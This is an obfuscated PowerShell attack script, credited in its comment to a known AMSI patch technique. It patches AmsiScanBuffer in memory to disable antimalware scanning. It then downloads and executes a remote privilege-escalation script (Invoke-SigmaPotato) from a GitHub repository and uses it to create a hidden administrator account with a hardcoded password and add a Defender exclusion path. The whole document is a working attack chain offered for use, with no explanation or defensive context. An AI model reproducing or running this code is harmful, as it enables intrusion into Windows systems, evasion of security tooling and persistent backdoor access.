#Rasta-mouses Amsi-Scan-Buffer patch \n
$bPf8vXn = @"
using System;
using System.Runtime.InteropServices;
public class bPf8vXn {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr BihxDXamejj, string exE8);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr K14e8vMM, UIntPtr SS3, uint sqIsuw340kWA4, out uint okcgV);
}
"@

Add-Type $bPf8vXn

$w_f3VUrQKKFqoMgrVNLJ = [bPf8vXn]::LoadLibrary("$([cHAR]([ByTE]0x61)+[CHar]([BytE]0x6d)+[cHAR](83+32)+[CHar]([BYte]0x69)+[CHAR](37+9)+[cHAr](100+97-97)+[cHAr]([byte]0x6c)+[ChaR](28+80))")
$nB4bsFm66Hl = [bPf8vXn]::GetProcAddress($w_f3VUrQKKFqoMgrVNLJ, "$([cHaR]([bYtE]0x41)+[CHar]([BYTe]0x6d)+[CHaR]([BytE]0x73)+[ChAr]([bytE]0x69)+[CHar]([BYTe]0x53)+[CHar](99*68/68)+[chAR](97+37-37)+[CHar](110)+[CHAR](66)+[cHAr]([bYTE]0x75)+[ChaR](102+67-67)+[ChAr]([BYte]0x66)+[cHar](101+3-3)+[ChAR]([BYte]0x72))")
$p = 0
[bPf8vXn]::VirtualProtect($nB4bsFm66Hl, [uint32]5, 0x40, [ref]$p)
$Jb5RTkfAX9b_ooPK7 = "0xB8"
$EzdGiheopbz5L1 = "0x57"
$nJU9HNQSC5zEM9b9w3 = "0x00"
$DpsG6XxTO1m = "0x07"
$ImtQ0wun = "0x80"
$W_p = "0xC3"
$fatv_ectuUXGd50pxa = [Byte[]] ($Jb5RTkfAX9b_ooPK7,$EzdGiheopbz5L1,$nJU9HNQSC5zEM9b9w3,$DpsG6XxTO1m,+$ImtQ0wun,+$W_p)
[System.Runtime.InteropServices.Marshal]::Copy($fatv_ectuUXGd50pxa, 0, $nB4bsFm66Hl, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"












